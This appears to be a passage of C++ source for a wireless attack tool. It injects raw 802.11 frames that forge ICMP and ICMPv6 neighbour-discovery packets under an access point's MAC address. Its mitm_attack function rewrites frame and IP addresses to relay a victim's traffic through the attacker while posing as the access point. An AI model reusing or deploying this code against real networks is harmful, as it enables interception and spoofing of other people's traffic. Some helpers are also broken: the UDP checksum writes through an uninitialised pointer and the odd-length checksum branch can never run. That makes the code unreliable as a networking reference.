    std::memcpy(data->addr3, apd->macAddr, ETH_ALEN); // SA
    
    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Configure LLC_SNAP
    llc_snap_hdr *const llcS = (llc_snap_hdr*)((uint8_t*)data + sizeof(ieee80211_hdr3));   
    if(remBytes < sizeof(llc_snap_hdr)) {
        std::cerr << "\nsendICMP: llc_snap hdr remBytes error\n";
        return -1;
    }

    // LLC Part
    llcS->dsap  = 0xAA; // snap
    llcS->ssap  = 0xAA; // snap
    llcS->ctrl1 = 0x03; // unnumbered frame(U-Frame)

    // SNAP Part
    std::memcpy(llcS->oui, oui_rfc1042, OUI_LEN); // ethernet encapsulation
    llcS->ether_type = htons(ETH_P_IP); // ip

    remBytes -= sizeof(llc_snap_hdr); // update bytes
       
    // Configure IP
    iphdr *const ip = (iphdr*)((uint8_t*)llcS + sizeof(llc_snap_hdr)); 
    if(remBytes < sizeof(iphdr)) {
        std::cerr << "\nsendICMP: ip hdr remBytes error\n";
        return -1;
    } 
    
    sockaddr_in sin;
    uint8_t     sip[IP_ALEN];
    inet_aton("192.168.0.2", &sin.sin_addr);
    std::memcpy(sip, &sin.sin_addr, IP_ALEN);

    ip->version  = IPVERSION; // IPv4
    ip->ihl      = 5; // 20 bytes(5 * 4)
    ip->tos      = IPTOS_PREC_ROUTINE; // routine
    ip->tot_len  = htons(sizeof(iphdr) + sizeof(icmphdr));
    ip->id       = htons(random());
    ip->frag_off = 0;
    ip->ttl      = IPDEFTTL; // default ttl(64) 
    ip->protocol = IPPROTO_ICMP; // icmp
    ip->check    = 0; // calc later
    std::memcpy((void*)&ip->saddr, sip, IP_ALEN); // SA
    std::memcpy((void*)&ip->daddr, tip, IP_ALEN); // DA

    // Now Calc IP Checksum
    ip->check = checksum((uint16_t*)ip, sizeof(iphdr));

    remBytes -= sizeof(iphdr); // update bytes

    // Configure ICMP
    icmphdr *const icmp = (icmphdr*)((uint8_t*)ip + (ip->ihl * 4)); 
    if(remBytes < sizeof(icmphdr)) {
        std::cerr << "\nsendICMP: icmp hdr remBytes error\n";
        return -1;
    }

    icmp->type       = icmp_type;
    icmp->code       = icmp_code;
    icmp->checksum   = 0; // calc later
    icmp->un.echo.id = ip->id; // use ip's id
    icmp->un.echo.sequence = htons(seqNum); // inc'd before in ieee80211 hdr

    // Now Calc ICMP Checksum
    icmp->checksum = checksum((uint16_t*)icmp, sizeof(icmphdr));

    remBytes -= sizeof(icmphdr); // update bytes   

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    uint32_t *fcs = (uint32_t*)((uint8_t*)icmp + sizeof(icmphdr));   
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nsendICMP: FCS remBytes error\n";
        return -1;
    }

    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), ICMP_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum

    remBytes -= sizeof(uint32_t); // update bytes   

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nsendICMP: ending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("sendICMP: ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OTHERHOST;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, ether_aton((const char*)da), ETH_ALEN);

    // Send Packet
    if(sendto(sfd, packet, ICMP_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendICMP: sendto");
        return -1;
    }

    // Success
    return 0;
}

// For Neighbor Discovery...
int sendICMPv6(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
               const uint8_t *const tha, const uint8_t icmp_type, const uint8_t icmp_code,
               const int sfd) {
    // Check Values
    if(!apd || !iface || !tha) {
        std::cerr << "\nsendICMPv6: value error\n";
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll)); 

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS;

    // Get Channel
    uint16_t chan_freq = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nsendICMPv6: channel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)

    // Beacon Size
    std::size_t ICMP_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                            sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_hdr3) +
                            sizeof(llc_snap_hdr) + sizeof(ipv6hdr) + sizeof(icmpv6hdr) +
                            sizeof(icmpv6_data) + sizeof(icmpv6_options_sll) + sizeof(uint32_t/* FCS */); // send size's through if make attachable diff data(type) & option////////////////////////////

    // Alloc Frame
    uint8_t *const packet = (uint8_t*)std::malloc(ICMP_SIZE);
    if(!packet) {
        std::perror("sendICMPv6: malloc");
        return -1;
    }

    uint32_t remBytes = ICMP_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nsendICMPv6: rtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *const rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version = 0;
    rtap->it_len     = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                       sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                       (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nsendICMPv6: flags remBytes error\n";
        return -1;
    }

    uint8_t *const flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\nsendICMPv6: data rate remBytes error\n";
        return -1;
    }

    uint8_t *const dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nsendICMPv6: chan freq remBytes error\n";
        return -1;
    }

    uint16_t *const channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nsendICMPv6: chan flags remBytes error\n";
        return -1;
    }

    uint16_t *const channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nsendICMPv6: ieee80211 hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_hdr3 *const data = (ieee80211_hdr3*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));

    data->frame_control |= 0x0200; // version 0, fromDS
    data->duration_id    = 0;
    data->seq_ctrl       = htole16((++seqNum) << 4); // seq + frag, just update seq
    data->frame_control |= WIFI_DATA;                // OR in Type, Subtype
    std::memcpy(data->addr1, tha, ETH_ALEN);
    std::memcpy(data->addr2, apd->macAddr, ETH_ALEN); // BSSID
    std::memcpy(data->addr3, apd->macAddr, ETH_ALEN); // SA
    
    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Configure LLC_SNAP
    llc_snap_hdr *const llcS = (llc_snap_hdr*)((uint8_t*)data + sizeof(ieee80211_hdr3));   
    if(remBytes < sizeof(llc_snap_hdr)) {
        std::cerr << "\nsendICMPv6: llc_snap hdr remBytes error\n";
        return -1;
    }

    // LLC Part
    llcS->dsap  = 0xAA; // snap
    llcS->ssap  = 0xAA; // snap
    llcS->ctrl1 = 0x03; // unnumbered frame(U-Frame)

    // SNAP Part
    std::memcpy(llcS->oui, oui_rfc1042, OUI_LEN); // ethernet encapsulation
    llcS->ether_type = htons(ETH_P_IPV6); // ipv6

    remBytes -= sizeof(llc_snap_hdr); // update bytes
       
    // Configure IPv6
    ipv6hdr *const ipv6 = (ipv6hdr*)((uint8_t*)llcS + sizeof(llc_snap_hdr)); 
    if(remBytes < sizeof(ipv6hdr)) {
        std::cerr << "\nsendICMPv6: ipv6 hdr remBytes error\n";
        return -1;
    } 

    ipv6->version  = 6; // IPv6
    ipv6->priority = 0; // traffic class 0
    // Differentiad Services
    // ECN-Capable Trransport
    // ECN-CE
    
    // Flow Lable, already set to 0

    ipv6->payload_len = htons(56);
    ipv6->nexthdr     = IPPROTO_ICMPV6;
    ipv6->hop_limit   = MAXTTL; // 255

    uint8_t sip[sizeof(in6_addr)];   
    uint8_t dip[sizeof(in6_addr)];
    int retSIP = inet_pton(AF_INET6, "fe81::10c4:1bed:c39f:25c3", sip);
    int retDIP = inet_pton(AF_INET6, "ff02::2", dip);

    // Check IP Conversions
    if(retSIP <= 0 || retDIP <= 0) {
        if(retSIP == 0 || retDIP == 0)
            std::cerr << "\nsendICMPv6: IPv6's not in presentation format\n";
        else
            std::cerr << "\nsendICMPv6: inet_pton\n";
        return -1;
    }

    std::memcpy((void*)&ipv6->saddr, (const void*)&sip, sizeof(in6_addr));
    std::memcpy((void*)&ipv6->daddr, (const void*)&dip, sizeof(in6_addr));

    remBytes -= sizeof(ipv6hdr); // update bytes   

    // Configure ICMPv6
    icmpv6hdr *const icmpv6 = (icmpv6hdr*)((uint8_t*)ipv6 + sizeof(ipv6hdr)); 
    if(remBytes < sizeof(icmpv6hdr)) {
        std::cerr << "\nsendICMPv6: icmpv6 hdr remBytes error\n";
        return -1;
    }

    icmpv6->type  = icmp_type;
    icmpv6->code  = icmp_code;
    icmpv6->cksum = 0; // calc later//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    remBytes -= sizeof(icmpv6hdr); // update bytes   

    // Configure ICMPv6 Data(type)
    icmpv6_data *const icmpv6_d = (icmpv6_data*)((uint8_t*)icmpv6 + sizeof(icmpv6hdr));
    if(remBytes < sizeof(icmpv6_data)) {
        std::cerr << "\nsendICMPv6: icmpv6_data hdr remBytes error\n";
        return -1;
    }

    icmpv6_d->cur_hop_limit = IPDEFTTL; // 64
    icmpv6_d->flags         = 0;
    icmpv6_d->lifetime      = 0; // unspecified(def is 10 min)
    icmpv6_d->reachable     = 0; // unspecified(def is 7 min)
    icmpv6_d->retrans       = 0; // unspecified(def is 10 min)

    remBytes -= sizeof(icmpv6_data); // update bytes

    // Configure ICMPv6 Options(SLL)
    icmpv6_options_sll *const icmpv6_sll = (icmpv6_options_sll*)((uint8_t*)icmpv6_d + sizeof(icmpv6_data));
    if(remBytes < sizeof(icmpv6_options_sll)) {
        std::cerr << "\nsendICMPv6: icmpv6_options_sll hdr remBytes error\n";
        return -1;
    }
    
    icmpv6_sll->type = 1; // sll
    icmpv6_sll->len  = 1; // 8 bytes
    std::memcpy(icmpv6_sll->lla, apd->macAddr, ETH_ALEN);

    remBytes -= sizeof(icmpv6_options_sll); // update bytes

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    uint32_t *fcs = (uint32_t*)((uint8_t*)icmpv6_sll + sizeof(icmpv6_options_sll));
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nsendICMPv6: FCS remBytes error\n";
        return -1;
    }

    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), ICMP_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum

    remBytes -= sizeof(uint32_t); // update bytes   

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nsendICMPv6: ending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("sendICMPv6: ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OTHERHOST;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, ether_aton((const char*)da), ETH_ALEN);

    // Send Packet
    if(sendto(sfd, packet, ICMP_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendICMPv6: sendto");
        return -1;
    }

    // Success
    return 0;
}

int mitm_attack(uint8_t *const packet, const unsigned len, const char *const iface, const bool fromDS,
                const uint8_t *const host, const uint8_t *const router, const uint8_t *const tip, const int sfd) {
    // Declarations
    const ie80211_rtaphdr *const rtap    = (ie80211_rtaphdr*)((uint8_t*)packet);
    u_ieee80211_hdrs   *const ie80211_un = (u_ieee80211_hdrs*)((uint8_t*)rtap + le16toh(rtap->it_len));
    const llc_snap_hdr *const llcS       = (llc_snap_hdr*)((uint8_t*)ie80211_un + sizeof(ieee80211_hdr3));
    iphdr *const ip                      = (iphdr*)((uint8_t*)llcS + sizeof(llc_snap_hdr));
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll));

    uint8_t realMAC[ETH_ALEN];
    std::memset(realMAC, 0, ETH_ALEN);
    std::memcpy((void *const)realMAC, (const void *const)ether_aton("1c:3e:84:8a:4c:26"), ETH_ALEN);
    
    sockaddr_in sin;
    uint8_t     realIP[IP_ALEN];
    inet_aton("192.168.0.8", &sin.sin_addr);
    std::memcpy(realIP, &sin.sin_addr, IP_ALEN);

    // Switch ieee80211 Addrs And IP Addrs Around
    /* FromDS(01) -> DA   (addr1), BSSID(addr2), SA(addr3) (AP -> STA)
       ToDS  (10) -> BSSID(addr1)  SA   (addr2), DA(addr3) (AP <- STA) */
    if(fromDS) { // from the router, send towards the host
        ie80211_un->ieee80211_3.frame_control |= 0x0200; // fromDS(0x01)
        std::memcpy(ie80211_un->ieee80211_3.addr1, host,        ETH_ALEN); // DA
        std::memcpy(ie80211_un->ieee80211_3.addr2, ap0.macAddr, ETH_ALEN); // BSSID
        std::memcpy(ie80211_un->ieee80211_3.addr3, ap0.macAddr, ETH_ALEN); // SA
        std::memcpy((void*)&ip->saddr, ap0.ipaddr, IP_ALEN); // SA
        std::memcpy((void*)&ip->daddr, tip,        IP_ALEN); // DA
    }
    else {       // from our host, send towards the router
        ie80211_un->ieee80211_3.frame_control |= 0x0100; // toDS(0x02)
        std::memcpy(ie80211_un->ieee80211_3.addr1, router,  ETH_ALEN); // BSSID
        std::memcpy(ie80211_un->ieee80211_3.addr2, realMAC, ETH_ALEN); // SA
        std::memcpy(ie80211_un->ieee80211_3.addr3, router,  ETH_ALEN); // DA
        std::memcpy((void*)&ip->saddr, realIP, IP_ALEN); // SA
        std::memcpy((void*)&ip->daddr, tip,    IP_ALEN); // DA
    }

    // Re-Calc IP Checksum
    ip->check = 0; // reset
    ip->check = checksum((uint16_t*)ip, (ip->ihl * 4));
    
    // Re-Calc ieee80211 FCS
    uint32_t *fcs = (uint32_t*)((uint8_t*)packet + len - sizeof(uint32_t));
    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), len - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OTHERHOST;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, ether_aton((const char*)da), ETH_ALEN);

    // Send Packet
    if(sendto(sfd, packet, len, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendto");
        return -1;
    }

    // Success
    return 0;
}

uint16_t chan_to_freq(const unsigned chan) {
    switch((uint16_t)chan) {
    case 1:
        return CHAN_1;
    case 2:
        return CHAN_2;
    case 3:
        return CHAN_3;
    case 4:
        return CHAN_4;
    case 5:
        return CHAN_5;
    case 6:
        return CHAN_6;
    case 7:
        return CHAN_7;
    case 8:
        return CHAN_8;
    case 9:
        return CHAN_9;
    case 10:
        return CHAN_10;
    case 11:
        return CHAN_11;
    case 12:
        return CHAN_12;
    case 13:
        return CHAN_13;
    case 14:
        return CHAN_14;
    default:
        break;
    };

    // Failure
    return 0;
}

uint16_t checksum(const uint16_t *buf, unsigned len) {
    // Initialize 
    uint32_t sum = 0;

    // 32-bit Accumalate(sum) Our Sequential 16-bit Words
    for(; len; sum += *buf++, ----len);

    // Mop Up Extra Bit len Is Odd
    if(len) sum += *(uint8_t*)buf;

    // Fold Checksum(High 16 To Low 16), Then Add Carry
    for(; sum >> 16; sum = (sum & 0xffff) + (sum >> 16));

    // Truncate Sum
    return ~sum;
}

uint16_t checksumUDP(const uint16_t *buf, const uint16_t len, const uint8_t *const sip, const uint8_t *const tip) {
    // Declarations
    psudeo_udphdr *udpP;
    udphdr        *udp   = (udphdr*) ((uint8_t*)buf);
    uint8_t       *pload = (uint8_t*)((uint8_t*)udp + sizeof(udphdr));
    unsigned csumSize = (sizeof(in_addr) * 2) + (sizeof(uint8_t) * 2) + sizeof(uint16_t) + len; ///////////////////////////////////////maybe use payload[0]

    // Fill UDP Psudeo Header
    std::memcpy((void*)&udpP->saddr.s_addr, sip, IP_ALEN); // SA
    std::memcpy((void*)&udpP->daddr.s_addr, tip, IP_ALEN); // DA
	udpP->pad        = 0;
	udpP->protocol   = IPPROTO_UDP; // udp
	udpP->udp_len    = htons(len);  // udphdr size + payload
    std::memcpy((void*)&udpP->udp,     udp,   sizeof(udphdr));       // udp header
    std::memcpy((void*)udpP->payload,  pload, len - sizeof(udphdr)); // payload header

    // Return Checksum
    return checksum((uint16_t*)udpP, csumSize);
}

